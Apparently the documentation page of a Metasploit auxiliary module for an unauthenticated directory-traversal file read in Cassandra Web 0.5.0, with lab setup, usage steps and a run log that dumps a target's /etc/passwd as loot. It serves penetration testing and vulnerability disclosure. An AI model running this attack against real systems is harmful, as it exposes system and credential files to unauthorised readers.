## Vulnerable Application
[Cassandra Web](https://rubygems.org/gems/cassandra-web) is an interface for Apache Cassandra using Ruby, Event-machine, AngularJS,
Server-Sent-Events and DataStaxRuby driver for Apache Cassandra.

This module has been tested successfully on Cassandra Web versions:
* cassandra-web-0.5.0 on Debian 10.11 (buster) with ruby 2.5.5p157 and Apache Cassandra 3.11.13

### Description

This module exploits an unauthenticated directory traversal vulnerability in Cassandra Web
'Cassandra Web' version 0.5.0 and earlier, allowing arbitrary file read with the web server privileges.
This vulnerability occured due to the disabled Rack::Protection module.

This web service listens on TCP port 3000 by default on all network interface.

Source and Installers:
* [Source Code Repository](https://github.com/avalanche123/cassandra-web)
* [Installers](https://rubygems.org/gems/cassandra-web)

Ruby installation:
```
apt install ruby-full -y
```

Gem installation:
```
gem install cassandra-web
```

Apache Cassandra Installation:
```
cat << EOF > /etc/apt/sources.list.d/cassandra.list
deb https://www.apache.org/dist/cassandra/debian 311x main
EOF
cat << EOF > /etc/apt/sources.list.d/adoptopenjdk.list
deb https://adoptopenjdk.jfrog.io/adoptopenjdk/deb/ buster main
EOF
wget -q -O - https://www.apache.org/dist/cassandra/KEYS | apt-key add -
wget -qO - https://adoptopenjdk.jfrog.io/adoptopenjdk/api/gpg/key/public | apt-key add -
apt update && apt install adoptopenjdk-8-hotspot cassandra -y
```

Run Cassandra Web:
```
cassandra-web
```

## Verification Steps
1. Do: `use auxiliary/scanner/http/cassandra_web_file_read.rb`
2. Do: `set RHOSTS [ips]`
3. Do: `run`

## Options

## Scenarios
### Cassandra Web 0.5.0 Linux Debian 10.11 (Ruby 2.5.5p157 and Apache Cassandra 3.11.13)
```
msf6 > use auxiliary/scanner/http/cassandra_web_file_read
msf6 auxiliary(scanner/http/cassandra_web_file_read) > set RHOSTS 192.168.56.1
RHOSTS => 192.168.56.1
msf6 auxiliary(scanner/http/cassandra_web_file_read) > run

[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Cassandra Web Detected
[*] Downloading file...

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:105:112:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ntp:x:107:115::/nonexistent:/usr/sbin/nologin
cassandra:x:108:116:Cassandra database,,,:/var/lib/cassandra:/usr/sbin/nologin


[+] File saved in: /home/git/.msf4/loot/20220802185716_default_192.168.56.1_cassandra.web.tr_160962.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
